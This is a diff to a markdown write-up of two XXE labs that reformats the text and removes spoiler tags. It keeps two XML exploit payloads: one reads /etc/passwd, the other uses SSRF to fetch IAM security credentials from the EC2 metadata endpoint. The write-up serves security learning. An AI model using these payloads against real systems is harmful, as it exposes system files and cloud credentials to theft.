@@ -21,16 +21,13 @@ You can notice that it use a normal xml format.
 
 ### Exp - Inject Directly
 Exploit Payload:
-```xml!
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
 ```
-:::spoiler Success Screenshot
 ![](https://i.imgur.com/2Xbsq4L.png)
 
----
 ![](https://i.imgur.com/3npCzv9.png)
-:::
 
 ---
 
@@ -41,17 +38,15 @@ The lab server is running a (simulated) EC2 metadata endpoint at the default URL
 
 ### Recon
 1. Intercept Package
-From the screenshot of the package, we noticed that the xml attached data could be injected.
-![](https://i.imgur.com/6o3vhzm.png)
+    
+    From the screenshot of the package, we noticed that the xml attached data could be injected.
+    ![](https://i.imgur.com/6o3vhzm.png)
 
 ### Exp - Inject Directly
 Exploit Payload:
-```xml!
+```xml
 <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
 ```
-:::spoiler Success Screenshot
 ![](https://i.imgur.com/hYjBqR8.png)
 
----
 ![](https://i.imgur.com/4ZBkJpE.png)
-:::
